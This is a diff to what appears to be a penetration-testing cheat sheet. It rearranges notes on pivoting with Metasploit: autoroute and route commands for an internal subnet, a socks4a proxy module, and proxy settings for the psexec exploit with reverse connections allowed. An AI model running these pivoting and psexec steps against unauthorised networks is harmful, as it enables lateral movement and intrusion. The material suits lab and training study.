@@ -154,18 +154,21 @@ creds_all
 run post/multi/manage/autoroute SUBNET=10.10.10.0 CMD=add
 ```
 CMD=autoadd should be fine in most cases   
-you will now to able to target anthing on 10.10.10.0 subnet in msf
+you will now to able to target anthing on 10.10.10.0 subnet in msf   
+Or you can use route   
+```
+msf > route add [subnet] [netmask] [sid]   
+```   
 
-```
-set Proxies socks4:127.0.0.1:9999
-Proxies => socks4:127.0.0.1:9999
-msf5 exploit(windows/smb/psexec) > set ReverseAllowProxy true
-```
 MSF usage of ssh -D proxy
 ```
 use auxiliary/server/socks4a
-```
-can also be used
+set Proxies socks4:127.0.0.1:9999
+Proxies => socks4:127.0.0.1:9999
+msf5 exploit(windows/smb/psexec) > set ReverseAllowProxy true
+```   
+
+
 
 #### John
 
